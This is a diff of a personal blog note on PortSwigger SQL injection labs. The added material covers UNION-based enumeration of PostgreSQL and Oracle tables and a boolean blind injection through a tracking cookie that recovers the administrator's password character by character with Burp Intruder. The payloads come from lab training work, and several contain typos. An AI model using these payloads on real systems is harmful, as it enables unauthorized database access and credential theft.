@@ -3,10 +3,16 @@ title: SQL injection
 tags:
   - 渗透
 abbrlink: 8b56535a
-description: SQL injection based on PostSwigger Lab
+description: SQL injection based on PostSwigger Lab and Rana Khalil
 date: 2024-03-17 00:26:00
 ---
+# SQL Injection Complete Guide by [Rana Khalil](https://www.youtube.com/@RanaKhalil101)
+[PostSwigger guide](https://portswigger.net/web-security/sql-injection)
 
+## What is SQL injection?
+
+
+# Labs
 [PostSwigger Lab - SQL injection](https://portswigger.net/web-security/sql-injection)
 
 **Tools**：BurpSuite，Chrome，switchyomega
@@ -29,9 +35,9 @@ date: 2024-03-17 00:26:00
 1. Find the number of columns
 `' order by 3--` -> Internal server error -> 3-1=2
 2. Find the data type of the columns
-`' UNION select 'a','a'--` -> both columns accept type text
+`' UNION select 'a','a'--` -> both columns accept text type
 3. Version of the database
-    - `' UNION SELECT @@version, NULL--` -> not Microsoft
+    - `' UNION SELECT @@version, NULL--` -> not Microsoft SQL and MySQL
     - `' UNION SELECT version()，NULL--` ->200 0K `PostgreSQL 12.17 (Ubuntu 12.17-0ubuntu0.20.04.1)`
 4. Output the list of table names in the database
     `' UNION SELECT table_name, NULL FROM information_schema.tables--` -> search `users` -> `users_vqrxmy`
@@ -53,7 +59,7 @@ date: 2024-03-17 00:26:00
 1. Determine the number of columns
 `' order by 3--` -> Internal server error -> 3-1=2
 2. Find the data type of the columns
-Oracle database -> `' UNION select 'a','a' from DUAL--` -> both columns accept type text
+Oracle database -> `' UNION select 'a','a' from DUAL--` -> both columns accept text type
 3. Output the list of tables in the database
 `' UNION SELECT table_name, NULL FROM all_tables--` -> search `users` -> `USERS_MQOBSV`
 4. Output the column names of the users table
@@ -70,9 +76,35 @@ Oracle database -> `' UNION select 'a','a' from DUAL--` -> both columns accept t
 ## 0x09 SQL injection UNION attack, retrieving multiple values in a single column
 
 ## 0x0A Blind SQL injection with conditional responses
+Vulnerable parameter - tracking cookie
 ***End Goals***:
+- Enumerate the password of the administrator
+- Log in as the administrator user
 
 ***Analysis***:
+1. Confirm that the parameter is vulnerable to blind SQLi
+    1. `select tracking-id from tracking-table where trackingId = ''`
+    -> If this tracking id exists -> query returns value -> Welcome back message
+    -> If the tracking id doesn't exist -> query returns nothing -> no Welcome back message
+    2. `select tracking-id from tracking-table where trackingId = 'RvLfBu6S9EZRIVYN" and 1=1--'`
+    -> TRUE -> Welcome back
+    3. `select tracking-id from tracking-table where trackingId = 'RvLfBu6S9EZRIVYN" and 1=0--'`
+    -> FALSE -> no Welcome back
+2. Confirm that we have a users table
+`select tracking-id from trackingtable where trackingId = 'RvLfBu6S9EZRIVYN' and(select 'x'from users LIMIT 1)='x'--'`
+-> users table exists in the database.
+
+3. Confirm that username administrator exists users table
+`select tracking-id from tracking-table where trackingId = 'RvLfBu6S9EZRIVYN' and (select username from users were username='administrator')='administrator'--`
+-> administrator user exists
+
+4. Enumerate the password of the administrator user
+    1. `select tracking-id from tracking-table where trackingId = 'RvLfBu6S9EZRIVYN' and (select username from users were username='administrator' and LENGTH(password)>1)='administrator'--`
+    -> use burp Intruder, set payload is numbers from 1 to 20 and step 1
+    -> 1 < password length < 20
+    2. `select tracking-id from tracking-table where trackingId = 'RvLfBu6S9EZRIVYN' and (select substring(password,1,1) from users were username='administrator')='a'--`
+    -> use burp Intruder, set payload is Brute focer, min length is 1 and max length is 1
+5. Combine passwords based on blasting results
 
 ## 0x0B Blind SQL injection with conditional errors
 
